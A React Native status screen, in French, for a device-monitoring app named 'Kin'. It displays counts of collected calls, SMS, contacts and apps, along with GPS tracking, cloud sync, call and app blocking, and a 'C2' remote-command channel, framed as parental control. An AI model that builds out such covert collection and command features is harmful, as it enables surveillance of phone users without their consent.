import React, { useEffect, useCallback } from 'react'
import { StyleSheet, View, Text, ActivityIndicator, Pressable } from 'react-native'
import { KinScreen } from '@/components/ui/KinScreen'
import { KinText } from '@/components/ui/KinText'
import { Colors } from '@/constants/colors'
import { useDeviceStatus } from '@/hooks/useDeviceStatus'
import { useCollectors } from '@/hooks/useCollectors'
import { useSyncStatus } from '@/hooks/useSyncStatus'
import { useRestrictions } from '@/hooks/useRestrictions'
import type { CollectorStats } from '@/services/CollectorEngine'

function formatRelativeTime(isoDate: string | null): string {
  if (!isoDate) return 'Jamais'
  const diffMs = Date.now() - new Date(isoDate).getTime()
  const diffMins = Math.floor(diffMs / 60_000)
  if (diffMins < 1) return "À l'instant"
  if (diffMins < 60) return `Il y a ${diffMins} min`
  const diffHrs = Math.floor(diffMins / 60)
  if (diffHrs < 24) return `Il y a ${diffHrs}h`
  return `Il y a ${Math.floor(diffHrs / 24)}j`
}

export function ProtectedScreen(): React.JSX.Element {
  const { registration } = useDeviceStatus()
  const { state: collectorState, start: startCollectors } = useCollectors()
  const { state: syncState, triggerSync, refreshState } = useSyncStatus()
  const { state: restrictionState } = useRestrictions()

  const collectorsActive = collectorState.phase === 'active'
  const collectorsStarting = collectorState.phase === 'starting'
  const collectorsError = collectorState.phase === 'error'
  const errorMessage = collectorState.phase === 'error' ? collectorState.message : null
  const stats: CollectorStats | null =
    collectorState.phase === 'active' ? collectorState.stats : null

  // Refresh sync store values when screen is focused
  useEffect(() => {
    refreshState()
  }, [refreshState])

  return (
    <KinScreen scrollable>
      <View style={styles.container}>

        {/* Header */}
        <View style={styles.header}>
          <View style={styles.iconRing}>
            <Text style={styles.icon}>🔒</Text>
          </View>
          <KinText variant="h2" align="center">Appareil protégé</KinText>
          <KinText variant="small" align="center" color={Colors.textSecondary}>
            Surveillance et synchronisation Kin active
          </KinText>
        </View>

        {/* Collector status badge */}
        {collectorsStarting ? (
          <View style={styles.badge}>
            <ActivityIndicator size="small" color={Colors.primary} />
            <KinText variant="caption" color={Colors.textMuted}>Initialisation…</KinText>
          </View>
        ) : collectorsActive ? (
          <View style={styles.badge}>
            <View style={[styles.dot, { backgroundColor: Colors.success }]} />
            <KinText variant="caption" color={Colors.success}>Surveillance active</KinText>
          </View>
        ) : (
          <View style={{ alignItems: 'center', gap: 8 }}>
            <View style={[styles.badge, styles.badgeError]}>
              <View style={[styles.dot, { backgroundColor: Colors.error }]} />
              <KinText variant="caption" color={Colors.error}>
                {collectorsError ? 'Erreur collecteurs' : 'Collecteurs inactifs'}
              </KinText>
            </View>
            {errorMessage && (
              <KinText variant="caption" align="center" color={Colors.error} style={{ paddingHorizontal: 20, opacity: 0.8 }}>
                {errorMessage}
              </KinText>
            )}
            <Pressable
              onPress={startCollectors}
              style={({ pressed }) => [styles.retryButton, pressed && { opacity: 0.7 }]}>
              <KinText variant="small" color={Colors.primary}>
                Relancer les collecteurs
              </KinText>
            </Pressable>
          </View>
        )}

        {/* Collector stats grid */}
        <View style={styles.statsGrid}>
          <StatCard icon="📞" label="Appels" value={stats?.calls ?? null} active={collectorsActive} />
          <StatCard icon="💬" label="SMS" value={stats?.sms ?? null} active={collectorsActive} />
          <StatCard icon="👤" label="Contacts" value={stats?.contacts ?? null} active={collectorsActive} />
          <StatCard icon="📦" label="Apps" value={stats?.apps ?? null} active={collectorsActive} />
        </View>

        {/* Sync panel */}
        <View style={styles.syncPanel}>
          <View style={styles.syncHeader}>
            <KinText variant="label" color={Colors.textSecondary}>Synchronisation</KinText>
            <View style={styles.syncBadge}>
              {syncState.status === 'syncing' ? (
                <ActivityIndicator size="small" color={Colors.primary} />
              ) : (
                <View style={[
                  styles.dot,
                  { backgroundColor: syncState.status === 'error' ? Colors.error : Colors.success }
                ]} />
              )}
              <KinText variant="caption" color={
                syncState.status === 'error' ? Colors.error :
                syncState.status === 'syncing' ? Colors.primary :
                Colors.success
              }>
                {syncState.status === 'syncing' ? 'En cours…' :
                 syncState.status === 'error' ? 'Erreur' : 'OK'}
              </KinText>
            </View>
          </View>

          <View style={styles.syncRow}>
            <KinText variant="small" color={Colors.textMuted}>Dernière sync</KinText>
            <KinText variant="small">{formatRelativeTime(syncState.lastSyncAt)}</KinText>
          </View>

          <View style={styles.syncRow}>
            <KinText variant="small" color={Colors.textMuted}>En attente</KinText>
            <KinText variant="small"
              color={syncState.pendingCount > 0 ? Colors.primary : Colors.textSecondary}>
              {syncState.pendingCount > 0 ? `${syncState.pendingCount} enreg.` : 'Aucun'}
            </KinText>
          </View>

          {syncState.lastResult && !syncState.lastResult.success && (
            <KinText variant="caption" color={Colors.error} style={styles.syncError}>
              {syncState.lastResult.error}
            </KinText>
          )}

          <Pressable
            onPress={triggerSync}
            disabled={syncState.status === 'syncing'}
            style={({ pressed }) => [
              styles.syncButton,
              pressed && styles.syncButtonPressed,
              syncState.status === 'syncing' && styles.syncButtonDisabled,
            ]}>
            <KinText variant="small" color={
              syncState.status === 'syncing' ? Colors.textMuted : Colors.primary
            }>
              {syncState.status === 'syncing' ? 'Synchronisation…' : 'Synchroniser maintenant'}
            </KinText>
          </Pressable>
        </View>

        {/* Service status rows */}
        <View style={styles.infoList}>
          <InfoRow icon="📍" label="Localisation GPS" active={stats?.gpsActive ?? false} />
          <InfoRow icon="📱" label="Applications installées" active={collectorsActive} />
          <InfoRow icon="🛡" label="Restrictions parentes" active={registration !== null} />
          <InfoRow icon="☁️" label="Sync cloud (15 min)" active={syncState.status !== 'error'} />
          <InfoRow icon="🚫" label="Blocage d'appels" active={restrictionState.callBlocking} />
          <InfoRow icon="🔒" label="Blocage d'apps" active={restrictionState.appBlocking} />
          <InfoRow icon="📡" label="Commandes C2" active={true} />
        </View>

        {/* UUID footer */}
        {registration && (
          <KinText variant="caption" align="center" style={styles.uuid}>
            {registration.uuid.slice(0, 8).toUpperCase()}…
          </KinText>
        )}
      </View>
    </KinScreen>
  )
}

function StatCard({
  icon, label, value, active,
}: {
  icon: string
  label: string
  value: number | null
  active: boolean
}): React.JSX.Element {
  return (
    <View style={statStyles.card}>
      <Text style={statStyles.icon}>{icon}</Text>
      <KinText variant="h3" align="center"
        color={active && value !== null ? Colors.primary : Colors.textMuted}>
        {value !== null ? String(value) : '—'}
      </KinText>
      <KinText variant="caption" align="center" color={Colors.textMuted}>{label}</KinText>
    </View>
  )
}

function InfoRow({
  icon, label, active,
}: {
  icon: string
  label: string
  active: boolean
}): React.JSX.Element {
  return (
    <View style={infoStyles.row}>
      <Text style={infoStyles.icon}>{icon}</Text>
      <KinText variant="small" style={infoStyles.label}>{label}</KinText>
      <View style={[infoStyles.dot, active ? infoStyles.dotActive : infoStyles.dotOff]} />
    </View>
  )
}

const styles = StyleSheet.create({
  container: {
    alignItems: 'center',
    gap: 16,
    paddingHorizontal: 4,
    paddingBottom: 32,
  },
  header: {
    alignItems: 'center',
    gap: 8,
    paddingTop: 8,
  },
  iconRing: {
    width: 72,
    height: 72,
    borderRadius: 36,
    backgroundColor: Colors.primaryLight,
    borderWidth: 1.5,
    borderColor: 'rgba(245, 158, 11, 0.3)',
    alignItems: 'center',
    justifyContent: 'center',
    marginBottom: 4,
  },
  icon: { fontSize: 28 },
  badge: {
    flexDirection: 'row',
    alignItems: 'center',
    gap: 7,
    backgroundColor: Colors.successBg,
    borderRadius: 20,
    paddingHorizontal: 14,
    paddingVertical: 6,
    borderWidth: 1,
    borderColor: 'rgba(34, 197, 94, 0.2)',
  },
  badgeError: {
    backgroundColor: 'rgba(239,68,68,0.08)',
    borderColor: 'rgba(239,68,68,0.2)',
  },
  dot: {
    width: 7,
    height: 7,
    borderRadius: 4,
  },
  statsGrid: {
    flexDirection: 'row',
    flexWrap: 'wrap',
    gap: 10,
    width: '100%',
  },
  syncPanel: {
    width: '100%',
    backgroundColor: Colors.surface,
    borderRadius: 16,
    padding: 16,
    gap: 12,
    borderWidth: 1,
    borderColor: Colors.border,
  },
  syncHeader: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
  },
  syncBadge: {
    flexDirection: 'row',
    alignItems: 'center',
    gap: 5,
  },
  syncRow: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
  },
  syncError: {
    opacity: 0.8,
  },
  syncButton: {
    marginTop: 4,
    paddingVertical: 10,
    borderRadius: 10,
    borderWidth: 1,
    borderColor: Colors.primary,
    alignItems: 'center',
  },
  syncButtonPressed: {
    backgroundColor: Colors.primaryLight,
  },
  syncButtonDisabled: {
    borderColor: Colors.border,
    opacity: 0.5,
  },
  infoList: {
    width: '100%',
    backgroundColor: Colors.surface,
    borderRadius: 16,
    padding: 16,
    gap: 12,
    borderWidth: 1,
    borderColor: Colors.border,
  },
  uuid: {
    opacity: 0.35,
    fontFamily: 'monospace',
  },
  retryButton: {
    paddingVertical: 8,
    paddingHorizontal: 18,
    borderRadius: 10,
    borderWidth: 1,
    borderColor: Colors.primary,
  },
})

const statStyles = StyleSheet.create({
  card: {
    flex: 1,
    minWidth: '44%',
    backgroundColor: Colors.surface,
    borderRadius: 14,
    padding: 14,
    alignItems: 'center',
    gap: 4,
    borderWidth: 1,
    borderColor: Colors.border,
  },
  icon: { fontSize: 20, marginBottom: 2 },
})

const infoStyles = StyleSheet.create({
  row: {
    flexDirection: 'row',
    alignItems: 'center',
    gap: 12,
  },
  icon: { fontSize: 16 },
  label: { flex: 1 },
  dot: { width: 8, height: 8, borderRadius: 4 },
  dotActive: { backgroundColor: Colors.success },
  dotOff: { backgroundColor: Colors.textMuted, opacity: 0.4 },
})
